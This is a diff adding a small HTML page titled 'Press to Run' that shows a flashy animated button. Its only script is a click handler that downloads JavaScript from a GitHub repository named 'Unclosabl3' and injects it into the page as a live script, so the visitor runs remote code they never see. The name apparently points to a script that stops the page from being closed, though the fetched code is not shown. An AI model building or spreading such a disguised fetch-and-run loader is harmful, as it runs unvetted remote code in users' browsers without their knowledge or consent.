@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Press to Run</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #ff6ec7, #845ec2, #00c9a7, #ff9671, #ffc75f);
+      background-size: 400% 400%;
+      animation: gradientMove 10s infinite alternate ease-in-out;
+      font-family: "Poppins", sans-serif;
+    }
+
+    @keyframes gradientMove {
+      0% { background-position: 0% 50%; }
+      100% { background-position: 100% 50%; }
+    }
+
+    button {
+      background: linear-gradient(45deg, #ff0000, #ff7300, #ffeb00, #47ff00, #00ffee, #2b65ff, #9d00ff);
+      background-size: 600% 600%;
+      animation: buttonGradient 5s linear infinite;
+      border: none;
+      border-radius: 50px;
+      padding: 20px 60px;
+      color: white;
+      font-size: 2rem;
+      cursor: pointer;
+      font-weight: bold;
+      text-transform: uppercase;
+      box-shadow: 0 0 30px rgba(255,255,255,0.5);
+      transition: transform 0.2s ease, box-shadow 0.3s ease;
+    }
+
+    @keyframes buttonGradient {
+      0% { background-position: 0% 50%; }
+      100% { background-position: 100% 50%; }
+    }
+
+    button:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 40px rgba(255,255,255,0.8);
+    }
+
+    button:active {
+      transform: scale(0.95);
+    }
+  </style>
+</head>
+<body>
+  <button id="pressButton">Press</button>
+
+  <script>
+    document.getElementById("pressButton").addEventListener("click", async () => {
+      const url = "https://raw.githubusercontent.com/snip3rxxgames/Unclosabl3/refs/heads/main/Unclosabl3.js.html";
+      try {
+        const response = await fetch(url);
+        const scriptText = await response.text();
+        const script = document.createElement("script");
+        script.innerHTML = scriptText;
+        document.body.appendChild(script);
+      } catch (error) {
+        alert("Error loading script: " + error);
+      }
+    });
+  </script>
+</body>
+</html>
